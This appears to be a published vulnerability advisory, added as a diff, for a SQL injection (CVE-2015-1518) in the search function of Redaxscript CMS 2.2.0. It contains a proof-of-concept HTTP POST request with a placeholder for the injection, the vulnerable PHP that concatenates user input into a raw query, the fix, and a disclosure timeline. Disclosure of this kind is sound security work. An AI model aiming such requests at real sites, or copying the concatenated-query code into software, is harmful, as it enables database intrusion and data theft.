@@ -1,0 +1,175 @@
+# Exploit Title: Radexscript CMS 2.2.0 - SQL Injection vulnerability
+# Google Dork: N/A
+# Date: 02/09/2015
+# Exploit Author: Pham Kien Cuong (cuong.k.pham@itas.vn) & ITAS Team (www.itas.vn)
+# Vendor Homepage: http://redaxscript.com/
+# Software Link: http://redaxscript.com/download/releases
+# Version: Redaxscript 2.2.0
+# Tested on: Linux
+# CVE : CVE-2015-1518
+
+
+:: PROOF OF CONCEPT ::
+
+POST /redaxscript/ HTTP/1.1
+Host: target.local
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=khtnnm1tvvk3s12if0no367872; GEAR=local-5422433b500446ead50002d4
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+
+search_terms=[SQL INJECTION HERE]&search_post=&token=24bcb285bc6f5c93203e4f95d9f2008331faf294&search_post=Search
+
+
+
+- Vulnerable parameter: $search_terms
+- Vulnerable file:      redaxscript/includes/search.php
+- Vulnerable function:  search_post()
+
+- Vulnerable code:
+function search_post()
+{
+	/* clean post */
+
+	if (ATTACK_BLOCKED < 10)
+	{
+		$search_terms = clean($_POST['search_terms'], 5);
+	}
+
+	/* validate post */
+
+	if (strlen($search_terms) < 3 || $search_terms == l('search_terms'))
+	{
+		$error = l('input_incorrect');
+	}
+
+	/* query results */
+
+	else
+	{
+		$search = array_filter(explode(' ', $search_terms));
+		$search_keys = array_keys($search);
+		$last = end($search_keys);
+
+		/* query search */
+
+		$query = 'SELECT id, title, alias, description, date, category, access FROM ' . PREFIX . 'articles WHERE (language = \'' . Redaxscript\Registry::get('language') . '\' || language = \'\') && status = 1';
+		if ($search)
+		{
+			$query .= ' && (';
+			foreach ($search as $key => $value)
+			{
+
+				$query .= 'title LIKE \'%' . $value . '%\' || description LIKE \'%' . $value . '%\' || keywords LIKE \'%' . $value . '%\' || text LIKE \'%' . $value . '%\'';
+				if ($last != $key)
+				{
+					$query .= ' || ';
+				}
+			}
+			$query .= ')';
+		}
+		$query .= ' ORDER BY date DESC LIMIT 50';
+		$result = Redaxscript\Db::forTablePrefix('articles')->rawQuery($query)->findArray();
+		$num_rows = count($result);
+		if ($result == '' || $num_rows == '')
+		{
+			$error = l('search_no');
+		}
+
+		/* collect output */
+
+		else if ($result)
+		{
+			$accessValidator = new Redaxscript\Validator\Access();
+			$output = '<h2 class="title_content title_search_result">' . l('search') . '</h2>';
+			$output .= form_element('fieldset', '', 'set_search_result', '', '', '<span class="title_content_sub title_search_result_sub">' . l('articles') . '</span>') . '<ol class="list_search_result">';
+			foreach ($result as $r)
+			{
+				$access = $r['access'];
+
+				/* if access granted */
+
+				if ($accessValidator->validate($access, MY_GROUPS) === Redaxscript\Validator\Validator::PASSED)
+				{
+					if ($r)
+					{
+						foreach ($r as $key => $value)
+						{
+							$$key = stripslashes($value);
+						}
+					}
+
+					/* prepare metadata */
+
+					if ($description == '')
+					{
+						$description = $title;
+					}
+					$date = date(s('date'), strtotime($date));
+
+					/* build route */
+
+					if ($category == 0)
+					{
+						$route = $alias;
+					}
+					else
+					{
+						$route = build_route('articles', $id);
+					}
+
+					/* collect item output */
+
+					$output .= '<li class="item_search_result">' . anchor_element('internal', '', 'link_search_result', $title, $route, $description) . '<span class="date_search_result">' . $date . '</span></li>';
+				}
+				else
+				{
+					$counter++;
+				}
+			}
+			$output .= '</ol></fieldset>';
+
+			/* handle access */
+
+			if ($num_rows == $counter)
+			{
+				$error = l('access_no');
+			}
+		}
+	}
+
+	/* handle error */
+
+	if ($error)
+	{
+		notification(l('something_wrong'), $error);
+	}
+	else
+	{
+		echo $output;
+	}
+}
+
+
+:: SOLUTION ::
+Update to Redaxscript 2.3.0
+
+::INFORMATION DISCLOSURE::
+- 11/27/2014: Inform the vendor
+- 11/28/2014: Vendor confirmed
+- 01/29/2015: Vendor releases patch
+- 01/05/2015: ITAS Team publishes information
+
+
+:: REFERENCE ::
+- http://www.itas.vn/news/itas-team-found-out-a-sql-injection-vulnerability-in-redaxscript-2-2-0-cms-75.html
+
+::COPYRIGHT::
+Copyright (c) ITAS CORP 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of ITAS CORP (www.itas.vn).
+
+:: DISCLAIMER ::
+THE INFORMATION PRESENTED HEREIN ARE PROVIDED ?AS IS? WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK.
